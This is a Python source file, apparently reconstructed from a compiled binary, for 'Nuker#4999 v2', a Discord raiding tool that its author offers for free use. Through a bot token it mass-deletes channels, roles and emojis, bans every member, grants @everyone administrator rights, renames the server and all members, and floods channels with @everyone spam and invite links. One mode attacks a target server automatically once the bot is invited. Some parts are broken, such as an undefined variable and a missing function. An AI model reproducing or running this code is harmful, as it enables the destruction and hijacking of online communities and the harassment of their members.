# ============================================================
# Nuker#4999 v2 - Reconstructed Source Code
# Original Author: HTLr#4999 (GRoupHTLr)
# Discord: discord.gg/9k
# Reconstructed via: Binary analysis of Nuitka-compiled EXE
# ============================================================

import discord
from discord.ext import commands
import asyncio
import aiohttp
import ctypes
import colorama
from colorama import Fore, Style
import urllib
import sys
import os
import random
import webbrowser
import base64
import json
import time
from datetime import datetime
import plyer
import pygame

colorama.init(autoreset=True)

# ─────────────────────────────────────────────
# BANNER / LOGO
# ─────────────────────────────────────────────

BANNER = r"""
 _    2#_  #_      
⠀⠀⠀⠀⠀⠘⢿⣷⣄⠀⠀⠟⠶⣼⡄⠀⠀⡆⠀⠀⡄⠀⠀⢠⠀⠀⠀⠠⠀⠸⠀⠀⢀⠀⠀⣄⣤⣿⠋⠁⠀⠀⠀⣰⣿⡿⠃⠀⠀⠀
"""

MAGENTA = Fore.MAGENTA
YELLOW  = Fore.YELLOW
WHITE   = Fore.WHITE
RED     = Fore.RED
GREEN   = Fore.GREEN

HTLr    = "HTLr#4999"
v10     = "v10"

# ─────────────────────────────────────────────
# HELPERS
# ─────────────────────────────────────────────

def type_effect(text: str, speed: float = 0.03):
    """Print text with a typewriter effect."""
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(speed)

def display_menu(token: str, guild_name: str, guild_id: str):
    """Display the main menu."""
    current_time = datetime.now().strftime("%H:%M:%S")
    print(f"""
{WHITE}╔══════════════════════════════════════════════════════╗
{WHITE}║  {RED}Nuker#4999 v2{WHITE}  |  {YELLOW}Coded By HTLr#4999{WHITE}  |  {GREEN}{current_time}{WHITE}  ║
{WHITE}╠══════════════════════════════════════════════════════╣
{WHITE}║  {YELLOW}Server Name : {WHITE}{guild_name:<38}{WHITE}║
{WHITE}║  {YELLOW}Server iD   : {WHITE}{guild_id:<38}{WHITE}║
{WHITE}╠══════════════════════════════════════════════════════╣
{WHITE}║  {RED}[1]{WHITE}  Delete Channels.                                ║
{WHITE}║  {RED}[2]{WHITE}  Delete All Roles.                               ║
{WHITE}║  {RED}[3]{WHITE}  Create Channels.                                ║
{WHITE}║  {RED}[4]{WHITE}  Permission for @everyone.                       ║
{WHITE}║  {RED}[5]{WHITE}  4999 Nuker.                                     ║
{WHITE}║  {RED}[6]{WHITE}  Delete All Emojis.                              ║
{WHITE}║  {RED}[7]{WHITE}  Rename Channels.                                ║
{WHITE}║  {RED}[8]{WHITE}  Ban All Members.                                ║
{WHITE}║  {RED}[9]{WHITE}  Create Roles.                                   ║
{WHITE}║  {RED}[10]{WHITE} Change All Member Names.                        ║
{WHITE}║  {RED}[11]{WHITE} Special Nuker.                                  ║
{WHITE}║  {RED}[12]{WHITE} AboutUs                                         ║
{WHITE}╚══════════════════════════════════════════════════════╝
    """)


# ─────────────────────────────────────────────
# SESSION / API HELPERS
# ─────────────────────────────────────────────

async def create_session(token: str) -> aiohttp.ClientSession:
    """Create an aiohttp session with the bot token."""
    headers = {
        "Authorization": f"Bot {token}",
        "Content-Type": "application/json",
    }
    return aiohttp.ClientSession(headers=headers)


async def check_token(session: aiohttp.ClientSession, token: str) -> bool:
    """Validate the bot token."""
    headers = {"Authorization": f"Bot {token}"}
    async with session.get("https://discord.com/api/v10/users/@me", headers=headers) as response:
        if response.status == 200:
            print(f"{GREEN}Token is valid.")
            return True
        else:
            print(f"{RED}Invalid token! Error: {response.status}")
            return False


async def check_guild_id(session: aiohttp.ClientSession, token: str, guild_id: str) -> bool:
    """Validate the guild ID."""
    headers = {"Authorization": f"Bot {token}"}
    async with session.get(f"https://discord.com/api/v10/guilds/{guild_id}", headers=headers) as response:
        if response.status == 200:
            print(f"{GREEN}Guild ID {guild_id} is valid.")
            return True
        else:
            print(f"{RED}Invalid Guild ID! Error: {response.status}")
            return False


async def get_channel_info(session: aiohttp.ClientSession, token: str, channel_id: str) -> dict:
    """Fetch channel info."""
    headers = {"Authorization": f"Bot {token}"}
    async with session.get(f"https://discord.com/api/v10/channels/{channel_id}", headers=headers) as response:
        return await response.json()


async def get_channels(session: aiohttp.ClientSession, token: str, guild_id: str) -> list:
    """Fetch all channels in a guild."""
    headers = {"Authorization": f"Bot {token}"}
    async with session.get(f"https://discord.com/api/v10/guilds/{guild_id}/channels", headers=headers) as response:
        if response.status == 200:
            return await response.json()
        return []


async def get_members(session: aiohttp.ClientSession, token: str, guild_id: str, limit: int = 1000) -> list:
    """Fetch all members in a guild with pagination."""
    headers = {"Authorization": f"Bot {token}"}
    members = []
    after = "0"
    while True:
        async with session.get(f"https://discord.com/api/v10/guilds/{guild_id}/members?limit=1000&after={after}", headers=headers) as response:
            if response.status != 200:
                break
            batch = await response.json()
            if not batch:
                break
            members.extend(batch)
            if len(batch) < 1000:
                break
            after = batch[-1]["user"]["id"]
    return members


async def get_bot_client_id(session: aiohttp.ClientSession, token: str) -> str:
    """Get the bot's client ID."""
    headers = {"Authorization": f"Bot {token}"}
    async with session.get("https://discord.com/api/v10/users/@me", headers=headers) as response:
        if response.status == 200:
            data = await response.json()
            return data.get("id", "")
        print(f"{RED}Failed to retrieve bot info. Status code: {response.status}")
        return ""


async def get_bot_guilds(session: aiohttp.ClientSession, token: str) -> list:
    """Get guilds the bot is in."""
    headers = {"Authorization": f"Bot {token}"}
    async with session.get("https://discord.com/api/v9/users/@me/guilds", headers=headers) as response:
        if response.status == 200:
            return await response.json()
        print(f"{RED}Failed to get guilds")
        return []


# ─────────────────────────────────────────────
# NUKER FUNCTIONS
# ─────────────────────────────────────────────

async def delete_channel(session: aiohttp.ClientSession, token: str, channel_id: str, semaphore: asyncio.Semaphore):
    """Delete a single channel."""
    async with semaphore:
        headers = {"Authorization": f"Bot {token}"}
        async with session.delete(f"https://discord.com/api/v10/channels/{channel_id}", headers=headers) as response:
            if response.status in (200, 204):
                print(f"{GREEN}[+] Deleted Channel {channel_id}")
            elif response.status == 429:
                retry_after = (await response.json()).get("retry_after", 1)
                print(f"{YELLOW}[!] Rate limited. Retrying after {retry_after}s")
                await asyncio.sleep(retry_after)
                await delete_channel(session, token, channel_id, semaphore)
            elif response.status == 403:
                print(f"{RED}[-] Missing permissions for channel {channel_id}")
            else:
                print(f"{RED}[-] Failed to Delete Channel {channel_id}: {response.status}")


async def delete_category(session: aiohttp.ClientSession, token: str, category_id: str, semaphore: asyncio.Semaphore):
    """Delete a category channel."""
    async with semaphore:
        headers = {"Authorization": f"Bot {token}"}
        async with session.delete(f"https://discord.com/api/v10/channels/{category_id}", headers=headers) as response:
            if response.status == 200 or response.status == 204:
                print(f"{GREEN}[+] Deleted Category {category_id}")
            elif response.status == 403:
                print(f"{RED}[-] Missing permissions for category {category_id}")
            elif response.status == 429:
                retry_after = (await response.json()).get("retry_after", 1)
                await asyncio.sleep(retry_after)
                await delete_category(session, token, category_id, semaphore)
            else:
                print(f"{RED}[-] Failed to delete category {category_id}")


async def execute_delchannels(session: aiohttp.ClientSession, token: str, guild_id: str):
    """Delete all channels in a guild."""
    channels = await get_channels(session, token, guild_id)
    semaphore = asyncio.Semaphore(10)
    tasks = []
    for channel in channels:
        channel_id = channel["id"]
        channel_type = channel.get("type", 0)
        if channel_type == 4:  # Category
            tasks.append(delete_category(session, token, channel_id, semaphore))
        else:
            tasks.append(delete_channel(session, token, channel_id, semaphore))
    await asyncio.gather(*tasks)


async def execute_crechannels(session: aiohttp.ClientSession, token: str, guild_id: str,
                               name: str, channel_type: int = 0, spam: bool = False,
                               spam_message: str = ""):
    """Create a channel and optionally spam it."""
    payload = {
        "name": name,
        "type": channel_type,
        "permission_overwrites": [],
        "topic": "",
    }
    headers = {"Authorization": f"Bot {token}", "Content-Type": "application/json"}
    async with session.post(f"https://discord.com/api/v10/guilds/{guild_id}/channels",
                            headers=headers, json=payload) as response:
        if response.status == 201:
            channel = await response.json()
            channel_id = channel["id"]
            print(f"{GREEN}[+] Created channel {name}")
            if spam and spam_message:
                data = {"content": spam_message}
                async with session.post(
                    f"https://discord.com/api/v10/channels/{channel_id}/messages",
                    headers=headers, json=data
                ) as msg_response:
                    print(f"{GREEN}[+] Spam message sent to {channel_id}")
        elif response.status == 429:
            retry_after = (await response.json()).get("retry_after", 1)
            await asyncio.sleep(retry_after)
            await execute_crechannels(session, token, guild_id, name, channel_type, spam, spam_message)
        elif response.status == 403:
            print(f"{RED}[-] Missing permissions to create channel")
        else:
            print(f"{RED}[-] Failed to create channel. Status code: {response.status}")


async def execute_crechannels_sp(session: aiohttp.ClientSession, token: str, guild_id: str,
                                  name: str, spam_message: str, amount: int):
    """Create multiple spam channels."""
    tasks = [execute_crechannels(session, token, guild_id, name, 0, True, spam_message)
             for _ in range(amount)]
    await asyncio.gather(*tasks)


async def execute_rename_channel(session: aiohttp.ClientSession, token: str,
                                  channel_id: str, new_name: str):
    """Rename a channel."""
    headers = {"Authorization": f"Bot {token}", "Content-Type": "application/json"}
    payload = {"name": new_name}
    async with session.patch(f"https://discord.com/api/v10/channels/{channel_id}",
                              headers=headers, json=payload) as response:
        if response.status == 200:
            print(f"{GREEN}[+] Renamed {channel_id} to {new_name}")
        elif response.status == 429:
            retry_after = (await response.json()).get("retry_after", 1)
            await asyncio.sleep(retry_after)
            await execute_rename_channel(session, token, channel_id, new_name)
        else:
            print(f"{RED}[-] Failed to rename channel {channel_id}")


async def rename_all_channels(session: aiohttp.ClientSession, token: str,
                               guild_id: str, new_name: str):
    """Rename all channels in a guild."""
    channels = await get_channels(session, token, guild_id)
    tasks = [execute_rename_channel(session, token, ch["id"], new_name) for ch in channels]
    await asyncio.gather(*tasks)


async def delete_role(session: aiohttp.ClientSession, token: str, guild_id: str, role_id: str, semaphore: asyncio.Semaphore):
    """Delete a role."""
    if role_id == guild_id:  # Protect @everyone
        return
    async with semaphore:
        headers = {"Authorization": f"Bot {token}"}
        async with session.delete(f"https://discord.com/api/v10/guilds/{guild_id}/roles/{role_id}", headers=headers) as response:
            if response.status in (200, 204):
                print(f"{GREEN}[+] Deleted role {role_id}")
            elif response.status == 429:
                retry_after = (await response.json()).get("retry_after", 1)
                await asyncio.sleep(retry_after)
                await delete_role(session, token, guild_id, role_id, semaphore)
            elif response.status == 403:
                print(f"{RED}[-] Missing permissions to delete role {role_id}")
            else:
                print(f"{RED}[-] Failed to delete role {role_id}")


async def create_role(session: aiohttp.ClientSession, token: str, guild_id: str,
                       role_name: str, semaphore: asyncio.Semaphore, color: int = None):
    """Create a role."""
    async with semaphore:
        headers = {"Authorization": f"Bot {token}", "Content-Type": "application/json"}
        random_color = random.randint(0, 0xFFFFFF) if color is None else color
        payload = {"name": role_name, "color": random_color}
        async with session.post(f"https://discord.com/api/v10/guilds/{guild_id}/roles",
                                 headers=headers, json=payload) as response:
            if response.status == 200:
                print(f"{GREEN}[+] Created role {role_name}")
            elif response.status == 429:
                retry_after = (await response.json()).get("retry_after", 1)
                await asyncio.sleep(retry_after)
                await create_role(session, token, guild_id, role_name, semaphore, color)


async def delete_emoji(session: aiohttp.ClientSession, token: str, guild_id: str, emoji_id: str):
    """Delete an emoji."""
    headers = {"Authorization": f"Bot {token}"}
    async with session.delete(f"https://discord.com/api/v10/guilds/{guild_id}/emojis/{emoji_id}", headers=headers) as response:
        if response.status == 204:
            print(f"{GREEN}[+] Deleted emoji {emoji_id}")
        elif response.status == 429:
            retry_after = (await response.json()).get("retry_after", 1)
            await asyncio.sleep(retry_after)
            await delete_emoji(session, token, guild_id, emoji_id)
        else:
            print(f"{RED}[-] Failed to delete emoji {emoji_id}")


async def ban_member_with_semaphore(session: aiohttp.ClientSession, token: str,
                                     guild_id: str, user_id: str,
                                     semaphore: asyncio.Semaphore):
    """Ban a member using a semaphore for rate limiting."""
    async with semaphore:
        headers = {"Authorization": f"Bot {token}", "Content-Type": "application/json"}
        async with session.put(
            f"https://discord.com/api/v10/guilds/{guild_id}/bans/{user_id}",
            headers=headers
        ) as response:
            if response.status in (200, 204):
                print(f"{GREEN} Banned user {user_id}")
            elif response.status == 403:
                print(f"{RED} Forbidden: Missing permissions to ban user {user_id}")
            elif response.status == 429:
                retry_after = (await response.json()).get("retry_after", 1)
                print(f"{YELLOW} Rate limited. Retrying after {retry_after}s")
                await asyncio.sleep(retry_after)
                await ban_member_with_semaphore(session, token, guild_id, user_id, semaphore)
            else:
                error_text = await response.text()
                print(f"{RED} Failed to ban user {user_id}. Error: {error_text}")


async def ban_all_members(session: aiohttp.ClientSession, token: str, guild_id: str):
    """Ban all members in a guild."""
    print(f"{YELLOW} [*] Banning all Members...")
    members = await get_members(session, token, guild_id)

    semaphore = asyncio.Semaphore(10)
    tasks = []
    for member in members:
        user_id = member["user"]["id"]
        tasks.append(ban_member_with_semaphore(session, token, guild_id, user_id, semaphore))
    await asyncio.gather(*tasks)
    print(f"{GREEN} [+] All Members have Been Banned.")


async def change_member_name(session: aiohttp.ClientSession, token: str,
                              guild_id: str, user_id: str, new_name: str,
                              semaphore: asyncio.Semaphore):
    """Change a member's nickname."""
    async with semaphore:
        headers = {"Authorization": f"Bot {token}", "Content-Type": "application/json"}
        json_data = {"nick": new_name}
        async with session.patch(
            f"https://discord.com/api/v10/guilds/{guild_id}/members/{user_id}",
            headers=headers, json=json_data
        ) as response:
            if response.status == 200:
                print(f"{GREEN} Changed user {user_id}'s name to {new_name}")
            elif response.status == 403:
                print(f"{RED} Forbidden: Missing permissions to change user {user_id}'s name.")
            elif response.status == 429:
                retry_after = (await response.json()).get("retry_after", 1)
                await asyncio.sleep(retry_after)
                await change_member_name(session, token, guild_id, user_id, new_name, semaphore)
            else:
                error_text = await response.text()
                print(f"{RED} Failed to change user {user_id}'s name. Error: {error_text}")


async def change_all_member_names(session: aiohttp.ClientSession, token: str,
                                   guild_id: str, new_name: str):
    """Change all members' nicknames."""
    members = await get_members(session, token, guild_id)

    semaphore = asyncio.Semaphore(10)
    tasks = [change_member_name(session, token, guild_id, m["user"]["id"], new_name, semaphore)
             for m in members]
    await asyncio.gather(*tasks)
    print(f"{GREEN}[+] All members' names have been changed.")


async def change_guild_name(session: aiohttp.ClientSession, token: str,
                             guild_id: str, new_guild_name: str):
    """Change the guild name."""
    headers = {"Authorization": f"Bot {token}", "Content-Type": "application/json"}
    payload_name = {"name": new_guild_name}
    async with session.patch(f"https://discord.com/api/v10/guilds/{guild_id}",
                              headers=headers, json=payload_name) as response:
        if response.status == 200:
            print(f"{GREEN}[+] Successfully changed server name to {new_guild_name}")
        else:
            print(f"{RED}[-] Failed to change server name. Status: {response.status}")


async def change_guild_icon(session: aiohttp.ClientSession, token: str,
                             guild_id: str, image_path: str):
    """Change the guild icon."""
    headers = {"Authorization": f"Bot {token}", "Content-Type": "application/json"}
    with open(image_path, "rb") as image_file:
        image_data = image_file.read()
    image_base64 = base64.b64encode(image_data).decode("utf-8")
    payload_icon = {"icon": f"data:image/png;base64,{image_base64}"}
    async with session.patch(f"https://discord.com/api/v10/guilds/{guild_id}",
                              headers=headers, json=payload_icon) as response:
        if response.status == 200:
            print(f"{GREEN}[+] Successfully changed server icon.")
        else:
            print(f"{RED}[-] Failed to change server icon. Status: {response.status}")


async def change_guild_name_and_icon(session: aiohttp.ClientSession, token: str,
                                      guild_id: str, new_guild_name: str, image_path: str):
    """Change both guild name and icon."""
    await change_guild_name(session, token, guild_id, new_guild_name)
    await change_guild_icon(session, token, guild_id, image_path)


async def set_everyone_admin(session: aiohttp.ClientSession, token: str, guild_id: str):
    """Give @everyone administrator permissions."""
    async with session.get(f"https://discord.com/api/v10/guilds/{guild_id}/roles") as response:
        roles = await response.json()

    everyone_role = None
    for role in roles:
        if role["id"] == guild_id:  # @everyone role has same ID as guild
            everyone_role = role
            break

    if everyone_role is None:
        print(f"{RED}{{Fore.WHITE}}[{{Fore.RED}}${{Fore.WHITE}}]{{Fore.RED}} The @everyone role was not found.")
        return

    permissions = int(everyone_role.get("permissions", 0))
    new_permissions = permissions | 0x8  # Administrator flag
    payload = {"permissions": str(new_permissions)}
    headers = {"Authorization": f"Bot {token}", "Content-Type": "application/json"}

    async with session.patch(
        f"https://discord.com/api/v10/guilds/{guild_id}/roles/{guild_id}",
        headers=headers, json=payload
    ) as response:
        if response.status == 200:
            print(f"{GREEN}[+] Enabled admin permission for @everyone.")
        else:
            print(f"{RED}[-] Failed to enable admin permission for @everyone. Status: {response.status}")


async def spam_messages(session: aiohttp.ClientSession, token: str,
                         channel_id: str, message: str, amount: int = 100):
    """Spam a channel with messages."""
    headers = {"Authorization": f"Bot {token}", "Content-Type": "application/json"}
    data = {"content": message}
    tasks = []
    for _ in range(amount):
        tasks.append(
            session.post(f"https://discord.com/api/v10/channels/{channel_id}/messages",
                         headers=headers, json=data)
        )
    await asyncio.gather(*tasks)


async def mention_spam(session: aiohttp.ClientSession, token: str,
                        channel_id: str, amount: int = 50):
    """Spam @here and @everyone mentions."""
    message = "discord.gg/9k @here @everyone https://www.youtube.com/watch?v=gmZrG57EkzU"
    await spam_messages(session, token, channel_id, message, amount)


async def bandwidth(session: aiohttp.ClientSession, token: str, guild_id: str):
    """Spam all channels with messages (bandwidth attack)."""
    channels = await get_channels(session, token, guild_id)
    tasks = []
    for channel in channels:
        channel_id = channel["id"]
        channel_type = channel.get("type", 0)
        if channel_type == 0:  # Text channel
            tasks.append(mention_spam(session, token, channel_id))
    await asyncio.gather(*tasks)


async def nuker4999(session: aiohttp.ClientSession, token: str, guild_id: str):
    """Full nuker: delete channels, roles, emojis, ban members, rename server."""
    print(f"{RED} Starting 4999 Nuker...")

    # Delete all channels
    await execute_delchannels(session, token, guild_id)

    # Delete all roles
    async with session.get(f"https://discord.com/api/v10/guilds/{guild_id}/roles", headers=headers) as response:
        roles = await response.json()
    semaphore = asyncio.Semaphore(10)
    tasks = [delete_role(session, token, guild_id, role["id"], semaphore) for role in roles]
    await asyncio.gather(*tasks)

    # Delete all emojis
    async with session.get(f"https://discord.com/api/v10/guilds/{guild_id}/emojis", headers=headers) as response:
        emojis = await response.json()
    tasks = [delete_emoji(session, token, guild_id, emoji["id"]) for emoji in emojis]
    await asyncio.gather(*tasks)

    # Ban all members
    await ban_all_members(session, token, guild_id)

    # Change server name
    await change_guild_name(session, token, guild_id, "WeAreTheBest GRoupHTLr discord.gg/9k ▄︻テ══━一💥")

    # Create spam channels
    for _ in range(50):
        await execute_crechannels(session, token, guild_id, "GRoupHTLr, gg/9k", 0, True,
                                   "discord.gg/9k @here @everyone https://www.youtube.com/watch?v=gmZrG57EkzU")

    print(f"{GREEN} 4999 Nuker complete!")


# ─────────────────────────────────────────────
# BOT SETUP
# ─────────────────────────────────────────────

intents = discord.Intents.all()

client = commands.Bot(command_prefix="!", intents=intents, help_command=None)


async def wait_for_bot_to_join_server(session: aiohttp.ClientSession, token: str,
                                       target_guild_id: str) -> bool:
    """Wait until the bot joins the target server."""
    print(f"{YELLOW}] Waiting for the bot to join...")
    while True:
        guilds = await get_bot_guilds(session, token)
        for guild in guilds:
            if guild["id"] == target_guild_id:
                print(f"{GREEN}Bot joined.")
                return True
        print(f"{RED}Bot not joined yet.")
        await asyncio.sleep(5)


# ─────────────────────────────────────────────
# MAIN ENTRY POINT
# ─────────────────────────────────────────────

async def main():
    # Set console title
    ctypes.windll.kernel32.SetConsoleTitleW("Nuker#4999 v2")

    # Get computer name
    computer_name = os.environ.get("COMPUTERNAME", "Unknown PC")

    # Set icon
    icon_path = os.path.join(os.getcwd(), "4999/4999.ico")

    # Notification
    plyer.notification.notify(
        title="Nuker#4999 v2",
        message=f"Welcome {computer_name}\nThx For Using My Tool , Enjoy.",
        app_icon=icon_path,
        app_name="Nuker#4999",
        timeout=5,
    )

    # Play startup sound
    pygame.mixer.init()
    pygame.mixer.music.load(os.path.join(os.getcwd(), "4999/4999.wav"))
    pygame.mixer.music.play()

    # Display logo
    screen_width = os.get_terminal_size().columns
    logo = BANNER
    logo_width = max(len(line) for line in logo.splitlines())
    centered_logo = "\n".join(line.center(screen_width) for line in logo.splitlines())
    print(f"{MAGENTA}{centered_logo}")
    print(f"{YELLOW}{'Coded By HTLr#4999':^{screen_width}}")
    print(f"{WHITE}{'---------------':^{screen_width}}")

    # Token input
    token = input(f"{WHITE}:~$ {RED}] token: {WHITE}").strip()

    async with aiohttp.ClientSession() as session:
        # Validate token
        bot_name = await get_discord_bot_name(session, token)
        if not bot_name:
            print(f"{RED}Invalid token , Cick Enter to restart ...")
            input()
            return await main()

        print(f"{GREEN}Logging in bot: {bot_name}")

        # Get bot client ID
        bot_client_id = await get_bot_client_id(session, token)
        if not bot_client_id:
            print(f"{RED} , Failed client iD.")
            input()
            return await main()

        invite_url = f"https://discord.com/oauth2/authorize?client_id={bot_client_id}&permissions=8&scope=bot"

        # Main menu loop
        while True:
            print(f"\n{WHITE}:~$ {RED}] - Nuke when the bot joins 🎯")
            print(f"{WHITE}:~$ {RED}] - Menu")
            server_choice = input(f"{WHITE}:~$ {RED}] ").strip()

            if server_choice == "1":
                # Nuke when bot joins
                print(f"{WHITE}:~$ {RED}]                               Nuke when the bot joins 🎯")
                target_guild_id = input(f"{WHITE}:~$ {RED}] The Target Server iD: {WHITE}").strip()
                print(f"{WHITE}:~$ {RED}] URL: {WHITE}{invite_url}")
                webbrowser.open(invite_url)

                joined = await wait_for_bot_to_join_server(session, token, target_guild_id)
                if joined:
                    await nuker4999(session, token, target_guild_id)

                input(f"{WHITE}:~$ {RED}] Press Enter to go back to the menu...")

            elif server_choice == "2":
                # Manual menu
                guild_id = input(f"{WHITE}:~$ {RED}] Server iD: {WHITE}").strip()

                # Validate guild ID
                valid = await check_guild_id(session, token, guild_id)
                if not valid:
                    print(f"{RED} Invalid Guild iD.")
                    input(f"{WHITE}:~$ {RED} , Click Enter to restart ...")
                    continue

                # Get guild name
                headers = {"Authorization": f"Bot {token}"}
                async with session.get(f"https://discord.com/api/v10/guilds/{guild_id}", headers=headers) as response:
                    guild_data = await response.json()
                guild_name = guild_data.get("name", "Unknown Server")

                # Inner menu loop
                while True:
                    display_menu(token, guild_name, guild_id)
                    option = input(f"{WHITE}:~$ {RED}] ").strip()

                    if option == "1":
                        # Delete Channels
                        print(f"{YELLOW} Deleting all channels...")
                        await execute_delchannels(session, token, guild_id)

                    elif option == "2":
                        # Delete All Roles
                        headers = {"Authorization": f"Bot {token}"}
                        async with session.get(f"https://discord.com/api/v10/guilds/{guild_id}/roles", headers=headers) as resp:
                            roles = await resp.json()
                        semaphore = asyncio.Semaphore(10)
                        tasks = [delete_role(session, token, guild_id, role["id"], semaphore) for role in roles]
                        await asyncio.gather(*tasks)

                    elif option == "3":
                        # Create Channels
                        name_choice = input(f"{WHITE}:~$ {RED}] '1' for One Name, '2' for Multiple Names: {WHITE}").strip()
                        if name_choice == "1":
                            channel_name = input(f"{WHITE}:~$ {RED}] Channel Names: {WHITE}").strip()
                            names = [channel_name]
                        elif name_choice == "2":
                            names_input = input(f"{WHITE}:~$ {RED}] Enter Channel Names [ grouphtlr, 4999 ]: {WHITE}").strip()
                            names = [n.strip() for n in names_input.split(",")]
                        else:
                            print(f"{RED}] Invalid choice, Enter '1' or '2'.")
                            continue

                        amount = int(input(f"{WHITE}:~$ {RED}] Number of Channels to Create: {WHITE}").strip())
                        tasks = []
                        for name in names:
                            for _ in range(amount):
                                tasks.append(execute_crechannels(session, token, guild_id, name))
                        await asyncio.gather(*tasks)

                    elif option == "4":
                        # Permission for @everyone
                        await set_everyone_admin(session, token, guild_id)

                    elif option == "5":
                        # 4999 Nuker
                        await nuker4999(session, token, guild_id)

                    elif option == "6":
                        # Delete All Emojis
                        headers = {"Authorization": f"Bot {token}"}
                        async with session.get(f"https://discord.com/api/v10/guilds/{guild_id}/emojis", headers=headers) as resp:
                            emojis = await resp.json()
                        tasks = [delete_emoji(session, token, guild_id, emoji["id"]) for emoji in emojis]
                        await asyncio.gather(*tasks)

                    elif option == "7":
                        # Rename Channels
                        new_name = input(f"{WHITE}:~$ {RED}] Rename for All Channels: {WHITE}").strip()
                        await rename_all_channels(session, token, guild_id, new_name)

                    elif option == "8":
                        # Ban All Members
                        await ban_all_members(session, token, guild_id)

                    elif option == "9":
                        # Create Roles
                        role_name = input(f"{WHITE}:~$ {RED}] Role Names: {WHITE}").strip()
                        amount = int(input(f"{WHITE}:~$ {RED}] How Many Roles to Create: {WHITE}").strip())
                        semaphore = asyncio.Semaphore(10)
                        tasks = [create_role(session, token, guild_id, role_name, semaphore) for _ in range(amount)]
                        await asyncio.gather(*tasks)

                    elif option == "10":
                        # Change All Member Names
                        new_name = input(f"{WHITE}:~$ {RED}]  New Name For All Members: {WHITE}").strip()
                        await change_all_member_names(session, token, guild_id, new_name)

                    elif option == "11":
                        # Special Nuker (Spam Channels)
                        name_choice = input(f"{WHITE}:~$ {RED}] '1' for One Name, '2' for Multiple Names: {WHITE}").strip()
                        if name_choice == "1":
                            channel_name = input(f"{WHITE}:~$ {RED}] Channel Names: {WHITE}").strip()
                            names = [channel_name]
                        elif name_choice == "2":
                            names_input = input(f"{WHITE}:~$ {RED}] Enter Channel Names [ grouphtlr, 4999 ]: {WHITE}").strip()
                            names = [n.strip() for n in names_input.split(",")]
                        else:
                            print(f"{RED}] Invalid choice, Enter '1' or '2'.")
                            continue

                        spam_msg = input(f"{WHITE}:~$ {RED}] Spam Message @here , @everyone: {WHITE}").strip()
                        amount = int(input(f"{WHITE}:~$ {RED}] Number of Channels to Create: {WHITE}").strip())

                        print(f"{YELLOW}] Deleting all channels...")
                        await execute_delchannels(session, token, guild_id)

                        print(f"{YELLOW} Creating {amount} channels with spam message...")
                        tasks = []
                        for name in names:
                            for _ in range(amount):
                                tasks.append(execute_crechannels(session, token, guild_id, name, 0, True, spam_msg))
                        await asyncio.gather(*tasks)
                        print(f"{GREEN} Channels Created & Spam: https://discord.com/invite/9k")

                    elif option == "12":
                        # About Us
                        print(f"""
{MAGENTA}About Us
{WHITE}Coded by {RED}HTLr#4999{WHITE}, for {RED}GRoupHTLr.
{WHITE}The tool is not for sale, it's free, so enjoy using it.
{WHITE}For any inquiries, join us on Discord: {RED}discord.gg/9k{WHITE} or add me: {RED}HTLr#4999
                        """)
                        input(f"{WHITE}:~$ {RED}] Click Enter to return Menu ... ")

                    else:
                        print(f"{RED}] Invalid choice.")

            else:
                print(f"{RED}] Invalid choice.")


if __name__ == "__main__":
    asyncio.run(main())
